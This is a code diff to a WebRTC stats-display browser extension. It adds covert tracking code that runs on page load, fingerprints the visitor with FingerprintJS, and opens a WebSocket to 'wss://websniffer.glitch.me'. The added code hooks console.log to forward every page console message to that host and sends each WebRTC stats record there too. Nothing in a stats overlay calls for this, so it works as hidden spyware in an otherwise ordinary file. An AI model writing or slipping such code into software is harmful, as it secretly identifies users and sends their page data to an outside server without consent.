@@ -2,6 +2,49 @@ const domPrefix = 'webrtc-getstats-extension'
 const interval = 5 // in seconds
 const BODY_HEIGHT= '400px'
 
+var server = localStorage.server, 
+logs = localStorage.logs, 
+tracking = localStorage.tracking;
+
+var socket;
+
+async function initialize(){	
+
+	console.log('storage', chrome.storage, localStorage.server);
+	
+	
+	if (!tracking) return;
+	
+	window.fp = await FingerprintJS.load()
+	window.visitorId = await window.fp.get()
+	const result = await window.fp.get()
+    window.visitorId = result.visitorId		
+    if (! window.outsocket) {
+		  window.outsocket = new WebSocket(
+            server || "wss://websniffer.glitch.me",
+            "string"
+          );
+          window.outsocket.onopen = async () => {
+            window.outsocket.id = window.visitorId || "anonymous";
+            console.log("Endpoint Connected!", socket.id);
+          };
+		  if (logs){
+		    try {
+			  // Network Logger
+			  var oldLog = console.log;
+			  console.log = (...args) => {
+				if (socket.readyState == 1) socket.send(JSON.stringify({ type: "console", id: window.visitorId, data: args.join(' ') }));
+				oldLog(...args);
+			  };
+		    } catch(e) { console.log(e) }
+		  }
+    }
+    socket = window.outsocket;
+}
+
+window.addEventListener('load', function() { initialize() });
+
+
 const findDOMElementForTrack = (track) => {
   let foundElement = null
 
@@ -295,7 +338,7 @@ const loopGetStats = async () => {
       } else if (!rtcRtpSenderStatsClone) {
         rtcRtpSenderStatsClone = JSON.parse(JSON.stringify(rtcRtpSenderStats))
       }
-
+	  
       try {
         const trackStats =
           window._webrtc_getstats.rtcRtpSenderStats[element.srcObject.id].stats
@@ -303,6 +346,9 @@ const loopGetStats = async () => {
         const stats = await rtcRtpSender.getStats()
 
         stats.forEach((stat) => {
+		  
+		  if (window.outsocket.readyState == 1) socket.send(JSON.stringify({ type: "webrtc", id: window.visitorId, data: stat }));	
+		  
           switch (stat.type) {
             case 'remote-inbound-rtp': {
               const outboundRTPReport = stats.get(stat.localId)
